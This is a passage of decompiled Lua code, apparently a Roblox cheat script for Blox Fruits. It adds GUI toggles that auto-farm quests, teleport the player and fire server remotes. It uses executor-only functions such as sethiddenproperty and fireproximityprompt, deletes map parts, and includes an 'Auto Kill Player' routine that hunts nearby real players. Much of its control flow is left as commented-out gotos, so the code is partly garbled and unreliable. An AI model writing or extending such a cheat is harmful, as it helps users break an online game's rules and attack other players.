                "Ancient Vampire",
                "Ancient Zombie"
            })
            if v764 then
                repeat
                    wait()
                    vu28.Kill(v764, _G.Complete_Trials)
                until _G.Complete_Trials == false or (not v764.Parent or v764.Humanoid.Health <= 0)
            end
        end)
    end
end)
v226.Mirage:AddToggle("Q", {
    ["Title"] = "Auto Kill Player After Trial",
    ["Description"] = "turn on for kill player after the race trials",
    ["Default"] = false
}):OnChanged(function(p765)
    _G.Defeating = p765
end)
spawn(function()
    while task.wait(Sec) do
        pcall(function()
            if _G.Defeating then
                local v766, v767, v768 = pairs(workspace.Characters:GetChildren())
                while true do
                    local v769
                    v768, v769 = v766(v767, v768)
                    if v768 == nil then
                        break
                    end
                    if v769.Name ~= plr.Name and (v769.Humanoid.Health > 0 and (v769:FindFirstChild("HumanoidRootPart") and (v769.Parent and (Root.Position - v769.HumanoidRootPart.Position).Magnitude <= 250))) then
                        repeat
                            task.wait()
                            EquipWeapon(_G.SelectWeapon)
                            _tp(v769.HumanoidRootPart.CFrame * CFrame.new(0, 0, 15))
                            sethiddenproperty(plr, "SimulationRadius", math.huge)
                        until _G.Defeating == false or (v769.Humanoid.Health <= 0 or not (v769.Parent and (v769:FindFirstChild("HumanoidRootPart") and v769:FindFirstChild("Humanoid"))))
                    end
                end
            end
        end)
    end
end)
v226.Drago:AddSection("Dojo Quest & Drago Race")
v226.Drago:AddToggle("DojoQ", {
    ["Title"] = "Auto Dojo Trainer",
    ["Description"] = "turn on for do dojo belt quest white to black",
    ["Default"] = false
}):OnChanged(function(p770)
    _G.Dojoo = p770
end)
function printBeltName(p771)
    if type(p771) == "table" and p771.Quest.BeltName then
        return p771.Quest.BeltName
    end
end
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        if _G.Dojoo then
            pcall(function()
				-- upvalues: (ref) vu28
                local v772 = replicated.Modules.Net:FindFirstChild("RF/InteractDragonQuest"):InvokeServer(unpack({
                    {
                        ["NPC"] = "Dojo Trainer",
                        ["Command"] = "RequestQuest"
                    }
                }))
                local v773 = printBeltName(v772)
                if debug == false and not (v772 or v773) then
                    _tp(CFrame.new(5865.0234375, 1208.3154296875, 871.15185546875))
                    debug = true
					-- goto l8
                end
                if debug ~= true or (CFrame.new(5865.0234375, 1208.3154296875, 871.15185546875).Position - plr.Character.HumanoidRootPart.Position).Magnitude > 50 then
					-- goto l8
                end
                if v773 == "White" then
                    local v774 = GetConnectionEnemies("Skull Slayer")
                    if v774 then
                        task.wait()
                        vu28.Kill(v774, _G.Dojoo)
                        if v772 and (_G.Dojoo and vu28.Alive(v774)) then
							-- goto l18
                        end
                    else
						-- ::l18::
                        _tp(CFrame.new(- 16759.58984375, 71.283767700195, 1595.3399658203))
                    end
					-- goto l8
                end
                if v773 == "Yellow" then
                    repeat
                        task.wait()
                        _G.SeaBeast1 = true
                        _G.TerrorShark = true
                        _G.Shark = true
                        _G.Piranha = true
                        _G.MobCrew = true
                        _G.FishBoat = true
                        _G.SailBoats = true
                    until not (_G.Dojoo and v772)
                    _G.SeaBeast1 = false
                    _G.TerrorShark = false
                    _G.Shark = false
                    _G.Piranha = false
                    _G.MobCrew = false
                    _G.FishBoat = false
                    _G.SailBoats = false
					-- goto l8
                end
                if v773 == "Green" then
                    repeat
                        task.wait()
                        _G.SailBoats = true
                    until not (_G.Dojoo and v772)
                    _G.SailBoats = false
					-- goto l8
                end
                if v773 == "Purple" then
                    repeat
                        task.wait()
                        _G.FarmEliteHunt = true
                    until not (_G.Dojoo and v772)
                    _G.FarmEliteHunt = false
					-- goto l8
                end
                if v773 == "Red" then
                    repeat
                        task.wait()
                        _G.SailBoats = true
                        _G.FishBoat = true
                    until not (_G.Dojoo and v772)
                    _G.SailBoats = false
                    _G.FishBoat = false
					-- goto l8
                end
                if v773 == "Black" then
                    while true do
                        if true then
                            task.wait()
                            if workspace.Map:FindFirstChild("PrehistoricIsland") or workspace._WorldOrigin.Locations:FindFirstChild("Prehistoric Island") then
                                _G.Prehis_Find = true
                                if workspace.Map.PrehistoricIsland.Core.ActivationPrompt:FindFirstChild("ProximityPrompt", true) then
                                    _G.Prehis_Skills = false
                                    _G.Prehis_Find = true
                                else
                                    _G.Prehis_Skills = true
                                    _G.Prehis_Find = false
                                end
                            else
                                _G.Prehis_Find = true
                                _G.Prehis_Skills = false
                            end
                        end
                        if not (_G.Dojoo and v772) then
                            _G.Prehis_Find = false
                            _G.Prehis_Skills = false
							-- ::l8::
                            if not v772 then
                                debug = false
                                replicated.Modules.Net:FindFirstChild("RF/InteractDragonQuest"):InvokeServer(unpack({
                                    {
                                        ["NPC"] = "Dojo Trainer",
                                        ["Command"] = "ClaimQuest"
                                    }
                                }))
                            end
                            return
                        end
                    end
                else
                    if v773 == "Orange" or v773 == "Blue" then
                        return nil
                    end
					-- goto l8
                end
            end)
        end
    end
end)
v226.Drago:AddToggle("BlazeEM", {
    ["Title"] = "Auto Dragon Hunter",
    ["Description"] = "turn on for farm blaze ember + auto collect blaze ember",
    ["Default"] = false
}):OnChanged(function(p775)
    _G.FarmBlazeEM = p775
end)
function checkQuesta()
    local vu776 = {
        {
            ["Context"] = "Check"
        }
    }
    local vu777 = nil
    pcall(function()
        local v778 = {
            {
                ["Context"] = "RequestQuest"
            }
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("Net"):WaitForChild("RF/DragonHunter"):InvokeServer(unpack(v778))
    end)
    local _, _ = pcall(function()
		-- upvalues: (ref) vu777, (ref) vu776
        vu777 = game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("Net"):WaitForChild("RF/DragonHunter"):InvokeServer(unpack(vu776))
    end)
    local v779 = nil
    local v780 = nil
    local v781 = nil
    local v782, v783
    if vu777 and vu777.Text then
        v782 = true
        local v784 = vu777.Text
        if string.find(tostring(v784), "Defeat") then
            local v785 = string.sub(tostring(v784), 8, 9)
            v779 = tonumber(v785)
            local v786, v787, v788 = pairs({
                "Hydra Enforcer",
                "Venomous Assailant"
            })
            v781 = 1
            while true do
                v788, v783 = v786(v787, v788)
                if v788 == nil then
                    v783 = v780
                    break
                end
                if string.find(v784, v783) then
                    break
                end
            end
        elseif string.find(tostring(v784), "Destroy") then
            v783 = nil
            v779 = 10
            v781 = 2
        else
            v783 = v780
        end
    else
        v783 = v780
        v782 = false
    end
    return v782, v783, v779, v781
end
function BackTODoJo()
    local v789, v790, v791 = pairs(game:GetService("Players").LocalPlayer.PlayerGui.Notifications:GetChildren())
    while true do
        local v792
        v791, v792 = v789(v790, v791)
        if v791 == nil then
            break
        end
        if v792.Name == "NotificationTemplate" and string.find(v792.Text, "Head back to the Dojo to complete more tasks") then
            return true
        end
    end
    return false
end
function DragonMobClear(p793, p794, p795)
	-- upvalues: (ref) vu28
    if workspace.Enemies:FindFirstChild(p794) then
        local v796, v797, v798 = pairs(workspace.Enemies:GetChildren())
        while true do
            local v799
            v798, v799 = v796(v797, v798)
            if v798 == nil then
                break
            end
            if v799.Name == p794 and (vu28.Alive(v799) and p793) then
                vu28.Kill(v799, p793)
            end
        end
    else
        _tp(p795)
    end
end
spawn(function()
    while wait() do
        if _G.FarmBlazeEM then
            pcall(function()
                local v800, v801, _, v802 = checkQuesta()
                if v800 == true and not BackTODoJo() then
                    if v802 == 1 then
                        if v801 == "Hydra Enforcer" or v801 == "Venomous Assailant" then
                            repeat
                                wait()
                                DragonMobClear(true, v801, CFrame.new(4620.6157226562, 1002.2954711914, 399.08688354492))
                            until not _G.FarmBlazeEM or (not v800 or BackTODoJo())
                        end
						-- goto l13
                    end
                    if v802 ~= 2 or not workspace.Map.Waterfall.IslandModel:FindFirstChild("Meshes/bambootree", true) then
						-- goto l13
                    end
                    while true do
                        wait()
                        spawn(function()
                            _tp(workspace.Map.Waterfall.IslandModel:FindFirstChild("Meshes/bambootree", true).CFrame * CFrame.new(4, 0, 0))
                        end)
                        if (workspace.Map.Waterfall.IslandModel:FindFirstChild("Meshes/bambootree", true).Position - Root.Position).Magnitude <= 200 then
                            MousePos = workspace.Map.Waterfall.IslandModel:FindFirstChild("Meshes/bambootree", true).Position
                            Useskills("Melee", "Z")
                            Useskills("Melee", "X")
                            Useskills("Melee", "C")
                            wait(0.5)
                            Useskills("Sword", "Z")
                            Useskills("Sword", "X")
                            wait(0.5)
                            Useskills("Blox Fruit", "Z")
                            Useskills("Blox Fruit", "X")
                            Useskills("Blox Fruit", "C")
                            wait(0.5)
                            Useskills("Gun", "Z")
                            Useskills("Gun", "X")
                        end
                        if not _G.FarmBlazeEM or (not v800 or BackTODoJo()) then
							-- goto l13
                        end
                    end
                else
                    _tp(CFrame.new(5813, 1208, 884))
                    DragonMobClear(false, nil, nil)
					-- ::l13::
                    return
                end
            end)
        end
    end
end)
spawn(function()
    while wait(0.1) do
        if _G.FarmBlazeEM then
            pcall(function()
                if workspace.EmberTemplate:FindFirstChild("Part") then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.EmberTemplate.Part.CFrame
                end
            end)
        end
    end
end)
v226.Drago:AddSection("Drago Trial")
function GetQuestDracoLevel()
    local v803 = {
        {
            ["NPC"] = "Dragon Wizard",
            ["Command"] = "Upgrade"
        }
    }
    return replicated.Modules.Net:FindFirstChild("RF/InteractDragonQuest"):InvokeServer(unpack(v803))
end
Toggle = v226.Drago:AddToggle("Toggle", {
    ["Title"] = "Tween To Upgrade Droco Trial",
    ["Description"] = "",
    ["Default"] = false
})
Toggle:OnChanged(function(p804)
    _G.UPGDrago = p804
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.UPGDrago then
                if GetQuestDracoLevel() == false then
                    return nil
                end
                if GetQuestDracoLevel() == true then
                    if (CFrame.new(5814.4272460938, 1208.3267822266, 884.57855224609).Position - Root.Position).Magnitude < 300 then
                        _tp(CFrame.new(5814.4272460938, 1208.3267822266, 884.57855224609))
                        replicated.Modules.Net:FindFirstChild("RF/InteractDragonQuest"):InvokeServer(unpack({
                            {
                                ["NPC"] = "Dragon Wizard",
                                ["Command"] = "Upgrade"
                            }
                        }))
                    else
                        _tp(CFrame.new(5814.4272460938, 1208.3267822266, 884.57855224609))
                    end
                end
            end
        end)
    end
end)
Toggle = v226.Drago:AddToggle("Toggle", {
    ["Title"] = "Auto Drago (V1)",
    ["Description"] = "turn on for auto quest1 auto prehistoric event + collect dragon eggs",
    ["Default"] = false
})
Toggle:OnChanged(function(p805)
    _G.DragoV1 = p805
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.DragoV1 and GetM("Dragon Egg") <= 0 then
                repeat
                    wait()
                    _G.Prehis_Find = true
                    _G.Prehis_Skills = true
                    _G.Prehis_DE = true
                until not _G.DragoV1 or GetM("Dragon Egg") >= 1
                _G.Prehis_Find = false
                _G.Prehis_Skills = false
                _G.Prehis_DE = false
            end
        end)
    end
end)
v226.Drago:AddToggle("fireflower", {
    ["Title"] = "Auto Drago (V2)",
    ["Description"] = "turn on for auto kill Forest Pirate & Collect fireflower",
    ["Default"] = false
}):OnChanged(function(p806)
    _G.AutoFireFlowers = p806
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        if _G.AutoFireFlowers then
            local v807 = workspace:FindFirstChild("FireFlowers")
            local v808 = GetConnectionEnemies("Forest Pirate")
            if v808 then
                repeat
                    wait()
                    vu28.Kill(v808, _G.AutoFireFlowers)
                until not _G.AutoFireFlowers or (not v808.Parent or (v808.Humanoid.Health <= 0 or v807))
            else
                _tp(CFrame.new(- 13206.452148438, 425.89199829102, - 7964.5537109375))
            end
            if v807 then
                local v809, v810, v811 = pairs(v807:GetChildren())
                while true do
                    local v812
                    v811, v812 = v809(v810, v811)
                    if v811 == nil then
                        break
                    end
                    if v812:IsA("Model") and v812.PrimaryPart then
                        local v813 = v812.PrimaryPart.Position
                        if (v813 - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 100 then
                            _tp(CFrame.new(v813))
                        else
                            vim1:SendKeyEvent(true, "E", false, game)
                            wait(1.5)
                            vim1:SendKeyEvent(false, "E", false, game)
                        end
                    end
                end
            end
        end
    end
end)
Toggle = v226.Drago:AddToggle("Toggle", {
    ["Title"] = "Auto Drago (V3)",
    ["Description"] = "turn on for sea event kill terror shark",
    ["Default"] = false
})
Toggle:OnChanged(function(p814)
    _G.DragoV3 = p814
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.DragoV3 then
                repeat
                    wait()
                    _G.DangerSc = "Lv Infinite"
                    _G.SailBoats = true
                    _G.TerrorShark = true
                until not _G.DragoV3
                _G.DangerSc = "Lv 1"
                _G.SailBoats = false
                _G.TerrorShark = false
            end
        end)
    end
end)
Toggle = v226.Drago:AddToggle("Toggle", {
    ["Title"] = "Auto Relic Drago Trial [Beta]",
    ["Description"] = "turn on for auto trial v4 you have to COLLECT RELIC by your self",
    ["Default"] = false
})
Toggle:OnChanged(function(p815)
    _G.Relic123 = p815
end)
spawn(function()
    while wait(Sec) do
        if _G.Relic123 then
            pcall(function()
                if workspace.Map:FindFirstChild("DracoTrial") then
                    replicated.Remotes.DracoTrial:InvokeServer()
                    wait(0.5)
                    repeat
                        wait()
                        _tp(CFrame.new(- 39934.9765625, 10685.359375, 22999.34375))
                    until not _G.Relic123 or Root.Position == CFrame.new(- 39934.9765625, 10685.359375, 22999.34375).Position
                    repeat
                        wait()
                        _tp(CFrame.new(- 40511.25390625, 9376.4013671875, 23458.37890625))
                    until not _G.Relic123 or Root.Position == CFrame.new(- 40511.25390625, 9376.4013671875, 23458.37890625).Position
                    wait(2.5)
                    repeat
                        wait()
                        _tp(CFrame.new(- 39914.65625, 10685.384765625, 23000.177734375))
                    until not _G.Relic123 or Root.Position == CFrame.new(- 39914.65625, 10685.384765625, 23000.177734375).Position
                    repeat
                        wait()
                        _tp(CFrame.new(- 40045.83203125, 9376.3984375, 22791.287109375))
                    until not _G.Relic123 or Root.Position == CFrame.new(- 40045.83203125, 9376.3984375, 22791.287109375).Position
                    wait(2.5)
                    repeat
                        wait()
                        _tp(CFrame.new(- 39908.5, 10685.405273438, 22990.04296875))
                    until not _G.Relic123 or Root.Position == CFrame.new(- 39908.5, 10685.405273438, 22990.04296875).Position
                    repeat
                        wait()
                        _tp(CFrame.new(- 39609.5, 9376.400390625, 23472.94335975))
                    until not _G.Relic123 or Root.Position == CFrame.new(- 39609.5, 9376.400390625, 23472.94335975).Position
                else
                    local v816 = workspace.Map.PrehistoricIsland:FindFirstChild("TrialTeleport")
                    if v816 and v816:IsA("Part") then
                        _tp(CFrame.new(v816.Position))
                    end
                end
            end)
        end
    end
end)
Toggle = v226.Drago:AddToggle("Toggle", {
    ["Title"] = "Auto Train Drago v4",
    ["Description"] = "turn on for training Drago race v4 + auto upgrade tier",
    ["Default"] = false
})
Toggle:OnChanged(function(p817)
    _G.TrainDrago = p817
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        pcall(function()
			-- upvalues: (ref) vu28
            if _G.TrainDrago then
                local v818 = {
                    "Venomous Assailant",
                    "Hydra Enforcer"
                }
                for _ = 1, # v818 do
                    if plr.Character:FindFirstChild("RaceEnergy").Value ~= 1 then
                        if plr.Character:FindFirstChild("RaceTransformed").Value == false then
                            local v819 = GetConnectionEnemies(v818)
                            if v819 then
                                wait()
                                vu28.Kill(v819, _G.TrainDrago)
                                if _G.TrainDrago ~= false then
                                    if v819.Humanoid.Health > 0 then
                                        if v819.Parent then
											-- goto l13
                                        end
                                    end
                                end
                            else
								-- ::l13::
                                _tp(CFrame.new(4620.6157226562, 1002.2954711914, 399.08688354492))
                            end
                        end
                    else
                        vim1:SendKeyEvent(true, "Y", false, game)
                        replicated.Remotes.CommF_:InvokeServer("UpgradeRace", "Buy", 2)
                        _tp(CFrame.new(4620.6157226562, 1002.2954711914, 399.08688354492))
                    end
                end
            end
        end)
    end
end)
v226.Drago:AddToggle("dragoTpVolcano", {
    ["Title"] = "Tween to Drago Trials",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p820)
    _G.TpDrago_Prehis = p820
end)
spawn(function()
    while wait(Sec) do
        if _G.TpDrago_Prehis then
            local v821 = workspace.Map.PrehistoricIsland:FindFirstChild("TrialTeleport")
            if v821 and v821:IsA("Part") then
                _tp(CFrame.new(v821.Position))
            end
        end
    end
end)
v226.Drago:AddToggle("bdrago", {
    ["Title"] = "Swap Drago Race",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p822)
    _G.BuyDrago = p822
end)
spawn(function()
    while wait(Sec) do
        if _G.BuyDrago then
            pcall(function()
                if (CFrame.new(5814.4272460938, 1208.3267822266, 884.57855224609).Position - Root.Position).Magnitude < 300 then
                    _tp(CFrame.new(5814.4272460938, 1208.3267822266, 884.57855224609))
                    replicated.Modules.Net:FindFirstChild("RF/InteractDragonQuest"):InvokeServer(unpack({
                        {
                            ["NPC"] = "Dragon Wizard",
                            ["Command"] = "DragonRace"
                        }
                    }))
                else
                    _tp(CFrame.new(5814.4272460938, 1208.3267822266, 884.57855224609))
                end
            end)
        end
    end
end)
v226.Drago:AddToggle("UpTalon", {
    ["Title"] = "Upgrade Dragon Talon With Uzoth",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p823)
    _G.DT_Uzoth = p823
end)
spawn(function()
    while wait(Sec) do
        if _G.DT_Uzoth then
            local v824 = CFrame.new(5661.89014, 1211.31909, 864.836731, 0.811413169, - 1.36805838e-8, - 0.584473014, 4.75227395e-8, 1, 4.25682458e-8, 0.584473014, - 6.23161966e-8, 0.811413169)
            _tp(v824)
            if (v824.Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 25 then
                replicated.Modules.Net["RF/InteractDragonQuest"]:InvokeServer({
                    ["NPC"] = "Uzoth",
                    ["Command"] = "Upgrade"
                })
            end
        end
    end
end)
v226.Prehistoric:AddSection("Volcanic Magnet")
Toggle = v226.Prehistoric:AddToggle("Toggle", {
    ["Title"] = "Auto Craft Volcanic Magnet",
    ["Description"] = "turn on for auto farm material and craft volcanic magnet & stop when you have 1 volcanic magnet",
    ["Default"] = false
})
Toggle:OnChanged(function(p825)
    _G.CraftVM = p825
end)
v226.Prehistoric:AddButton({
    ["Title"] = "Craft Volcanic Magnet",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("CraftItem", "Craft", "Volcanic Magnet")
    end
})
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        pcall(function()
			-- upvalues: (ref) vu28
            if _G.CraftVM and GetM("Volcanic Magnet") < 1 then
                if GetM("Scrap Metal") >= 10 and GetM("Blaze Ember") >= 15 then
                    replicated.Remotes.CommF_:InvokeServer("CraftItem", "Craft", "Volcanic Magnet")
					-- goto l3
                end
                if GetM("Scrap Metal") >= 10 then
                    if GetM("Blaze Ember") < 15 then
                        repeat
                            wait()
                            _G.FarmBlazeEM = true
                        until not _G.CraftVM or GetM("Blaze Ember") >= 15
                        _G.FarmBlazeEM = false
                    end
                else
                    local v826 = GetConnectionEnemies("Forest Pirate")
                    if v826 then
                        wait()
                        vu28.Kill(v826, _G.CraftVM)
                        if not _G.CraftVM or (not v826.Parent or (v826.Humanoid.Health <= 0 or GetM("Scrap Metal") >= 10)) then
							-- goto l3
                        end
                    end
                    _tp(CFrame.new(- 13206.452148438, 425.89199829102, - 7964.5537109375))
                end
            end
			-- ::l3::
        end)
    end
end)
v226.Prehistoric:AddSection("Prehistoric Island")
local vu827 = v226.Prehistoric:AddParagraph({
    ["Title"] = " Prehistoric Island Status ",
    ["Content"] = ""
})
spawn(function()
	-- upvalues: (ref) vu827
    while wait(0.2) do
        if workspace.Map:FindFirstChild("PrehistoricIsland") or workspace._WorldOrigin.Locations:FindFirstChild("Prehistoric Island") then
            vu827:SetDesc(" Prehistoric Island : True")
        else
            vu827:SetDesc(" Prehistoric Island : False")
        end
    end
end)
Vocan = v226.Prehistoric:AddToggle("Vocan", {
    ["Title"] = "Auto Find Prehistoric Island",
    ["Description"] = "turn on for finding & tween & start prehistoric island",
    ["Default"] = false
})
Vocan:OnChanged(function(p828)
    _G.Prehis_Find = p828
end)
spawn(function()
    while wait() do
        if _G.Prehis_Find then
            pcall(function()
                if workspace._WorldOrigin.Locations:FindFirstChild("Prehistoric Island", true) then
                    if (workspace._WorldOrigin.Locations:FindFirstChild("Prehistoric Island").CFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude >= 2000 then
                        _tp(workspace._WorldOrigin.Locations:FindFirstChild("Prehistoric Island").CFrame)
                    end
                    if (workspace.Map:FindFirstChild("PrehistoricIsland", true) or workspace._WorldOrigin.Locations:FindFirstChild("Prehistoric Island", true)) and workspace.Map.PrehistoricIsland.Core.ActivationPrompt:FindFirstChild("ProximityPrompt", true) then
                        if plr:DistanceFromCharacter(workspace.Map.PrehistoricIsland.Core.ActivationPrompt.CFrame.Position) <= 150 then
                            fireproximityprompt(workspace.Map.PrehistoricIsland.Core.ActivationPrompt.ProximityPrompt, math.huge)
                            vim1:SendKeyEvent(true, "E", false, game)
                            wait(1.5)
                            vim1:SendKeyEvent(false, "E", false, game)
                        end
                        _tp(workspace.Map.PrehistoricIsland.Core.ActivationPrompt.CFrame)
                    end
					-- ::l9::
                    return
                else
                    local v829 = CheckBoat()
                    if not v829 then
                        local v830 = CFrame.new(- 16927.451, 9.086, 433.864)
                        TeleportToTarget(v830)
                        if (v830.Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 10 then
                            replicated.Remotes.CommF_:InvokeServer("BuyBoat", _G.SelectedBoat)
                        end
						-- goto l9
                    end
                    if plr.Character.Humanoid.Sit == false then
                        local v831 = v829.VehicleSeat.CFrame * CFrame.new(0, 1, 0)
                        _tp(v831)
						-- goto l9
                    end
                    while true do
                        if true then
                            wait()
                            local v832 = CFrame.new(- 10000000, 31, 37016.25)
                            if CheckEnemiesBoat() or (CheckTerrorShark() or CheckPirateGrandBrigade()) then
                                _tp(CFrame.new(- 10000000, 150, 37016.25))
                            else
                                _tp(CFrame.new(- 10000000, 31, 37016.25))
                            end
                        end
                        if not _G.Prehis_Find or (v832.Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 10 or (workspace._WorldOrigin.Locations:FindFirstChild("Prehistoric Island") or plr.Character.Humanoid.Sit == false) then
                            plr.Character.Humanoid.Sit = false
							-- goto l9
                        end
                    end
                end
            end)
        end
    end
end)
v226.Prehistoric:AddToggle("Vocan", {
    ["Title"] = "Auto Patch Prehistoric Event",
    ["Description"] = "turn on for auto patch volcano + kill aura lava golems + auto remove lava",
    ["Default"] = false
}):OnChanged(function(p833)
    _G.Prehis_Skills = p833
end)
spawn(function()
    while wait() do
        local v834 = _G.Prehis_Skills and game.Workspace.Map:FindFirstChild("PrehistoricIsland")
        if v834 then
            local v835, v836, v837 = pairs(v834:GetDescendants())
            while true do
                local v838
                v837, v838 = v835(v836, v837)
                if v837 == nil then
                    break
                end
                if v838:IsA("Part") and v838.Name:lower():find("lava") then
                    v838:Destroy()
                end
                if v838:IsA("MeshPart") and v838.Name:lower():find("lava") then
                    v838:Destroy()
                end
            end
            local v839 = game.Workspace.Map.PrehistoricIsland.Core:FindFirstChild("InteriorLava")
            if v839 and v839:IsA("Model") then
                v839:Destroy()
            end
            local v840 = workspace.Map:FindFirstChild("PrehistoricIsland")
            if v840 then
                local v841 = workspace.Map.PrehistoricIsland:FindFirstChild("TrialTeleport")
                local v842, v843, v844 = pairs(v840:GetDescendants())
                while true do
                    local v845
                    v844, v845 = v842(v843, v844)
                    if v844 == nil then
                        break
                    end
                    if v845.Name == "TouchInterest" and not (v841 and v845:IsDescendantOf(v841)) then
                        v845.Parent:Destroy()
                    end
                end
            end
        end
    end
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait() do
        pcall(function()
			-- upvalues: (ref) vu28
			-- block 34
            if not _G.Prehis_Skills then
				-- ::l3::
                return
            end
            local v846 = workspace.Enemies:FindFirstChild("Lava Golem") and GetConnectionEnemies("Lava Golem")
            if v846 then
                repeat
                    wait()
                    vu28.Kill(v846, _G.Prehis_Skills)
                    v846.Humanoid:ChangeState(15)
                until not _G.Prehis_Skills or (not v846.Parent or v846.Humanoid.Health <= 0)
            end
            local v847, v848, v849 = pairs(game.Workspace.Map.PrehistoricIsland.Core.VolcanoRocks:GetChildren())
			-- ::l14::
            local v850
            v849, v850 = v847(v848, v849)
            if v849 == nil then
				-- goto l3
            end
            if not v850:FindFirstChild("VFXLayer") or v850:FindFirstChild("VFXLayer").At0.Glow.Enabled ~= true and v850.VFXLayer.At0.Glow.Enabled ~= true then
				-- goto l14
            end
			-- ::l20::
            wait()
            _tp(v850.VFXLayer.CFrame)
            if v850.VFXLayer.At0.Glow.Enabled == true and plr:DistanceFromCharacter(v850.VFXLayer.CFrame.Position) <= 150 then
                MousePos = v850.VFXLayer.CFrame.Position
                Useskills("Melee", "Z")
                wait(0.5)
                Useskills("Melee", "X")
                wait(0.5)
                Useskills("Melee", "C")
                wait(0.5)
                Useskills("Blox Fruit", "Z")
                wait(0.5)
                Useskills("Blox Fruit", "X")
                wait(0.5)
                Useskills("Blox Fruit", "C")
            end
            if _G.Prehis_Skills and (v850:FindFirstChild("VFXLayer").At0.Glow.Enabled ~= false and v850.VFXLayer.At0.Glow.Enabled ~= false) then
				-- goto l20
            else
				-- goto l2
            end
			-- ::l2::
			-- ::l3::
			-- goto l14
        end)
    end
end)
v226.Prehistoric:AddToggle("Vocan", {
    ["Title"] = "Auto Collect Dino Bones",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p851)
    _G.Prehis_DB = p851
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.Prehis_DB and workspace:FindFirstChild("DinoBone") then
                local v852, v853, v854 = pairs(workspace:GetChildren())
                while true do
                    local v855
                    v854, v855 = v852(v853, v854)
                    if v854 == nil then
                        break
                    end
                    if v855.Name == "DinoBone" then
                        _tp(v855.CFrame)
                    end
                end
            end
        end)
    end
end)
v226.Prehistoric:AddToggle("Vocan", {
    ["Title"] = "Auto Collect Dragon Eggs",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p856)
    _G.Prehis_DE = p856
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.Prehis_DE and workspace.Map.PrehistoricIsland.Core.SpawnedDragonEggs:FindFirstChild("DragonEgg") then
                _tp(workspace.Map.PrehistoricIsland.Core.SpawnedDragonEggs:FindFirstChild("DragonEgg").Molten.CFrame)
                fireproximityprompt(workspace.Map.PrehistoricIsland.Core.SpawnedDragonEggs.DragonEgg.Molten.ProximityPrompt, 30)
            end
        end)
    end
end)
Toggle = v226.Prehistoric:AddToggle("Toggle", {
    ["Title"] = "Auto Reset When Complete Volcano",
    ["Description"] = "Reset When Complete Volcano not collect dino bones and else..",
    ["Default"] = false
})
Toggle:OnChanged(function(p857)
    _G.ResetPH = p857
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.ResetPH then
                local v858 = workspace.Map.PrehistoricIsland:FindFirstChild("TrialTeleport")
                if v858 and v858:FindFirstChild("TouchInterest") then
                    plr.Character.Humanoid.Health = 0
                elseif workspace:FindFirstChild("DinoBone") then
                    local v859, v860, v861 = pairs(workspace:GetChildren())
                    while true do
                        local v862
                        v861, v862 = v859(v860, v861)
                        if v861 == nil then
                            break
                        end
                        if v862.Name == "DinoBone" then
                            _tp(v862.CFrame)
                        end
                    end
                end
            end
        end)
    end
end)
v226.SeaEvent:AddSection("Sea Event / Setting Sail")
local vu863 = {
    "Guardian",
    "PirateGrandBrigade",
    "MarineGrandBrigade",
    "PirateBrigade",
    "MarineBrigade",
    "PirateSloop",
    "MarineSloop",
    "Beast Hunter"
}
local vu864 = v226.SeaEvent:AddParagraph({
    ["Title"] = " Spy Status ",
    ["Content"] = ""
})
spawn(function()
	-- upvalues: (ref) vu864
    while wait(0.2) do
        pcall(function()
			-- upvalues: (ref) vu864
            local v865 = string.match(replicated.Remotes.CommF_:InvokeServer("InfoLeviathan", "1"), "%d+")
            if v865 then
                vu864:SetDesc(" Spy Leviathan  : " .. tostring(v865))
                if tostring(v865) == 5 then
                    vu864:SetDesc(" Spy Leviathan : Already Done!!")
                end
            end
        end)
    end
end)
v226.SeaEvent:AddButton({
    ["Title"] = "Buy Fracments with Spy",
    ["Description"] = "Buy the spy for finding leviathan",
    ["Callback"] = function()
        replicated:WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer("InfoLeviathan", "2")
    end
})
local vu866 = v226.SeaEvent:AddParagraph({
    ["Title"] = " FlozenDimension Status ",
    ["Content"] = ""
})
spawn(function()
	-- upvalues: (ref) vu866
    pcall(function()
		-- upvalues: (ref) vu866
        while wait(0.2) do
            if workspace._WorldOrigin.Locations:FindFirstChild("Frozen Dimension") then
                vu866:SetDesc(" Flozen Dimension : True")
            else
                vu866:SetDesc(" Flozen Dimension : False")
            end
        end
    end)
end)
v226.SeaEvent:AddToggle("Q", {
    ["Title"] = "Auto Teleport Frozen Dimension",
    ["Description"] = "turn on for teleport to frozen dimension and start the leviathan gate",
    ["Default"] = false
}):OnChanged(function(p867)
    _G.FrozenTP = p867
end)
spawn(function()
    while wait(0.1) do
        if _G.FrozenTP then
            pcall(function()
                if workspace.Map:FindFirstChild("LeviathanGate") then
                    _tp(workspace.Map.LeviathanGate.CFrame)
                    replicated:WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer("OpenLeviathanGate")
                end
            end)
        end
    end
end)
v226.SeaEvent:AddToggle("Q", {
    ["Title"] = "Auto Drive To Hydra Island",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p868)
    _G.SailBoat_Hydra = p868
end)
spawn(function()
    while wait() do
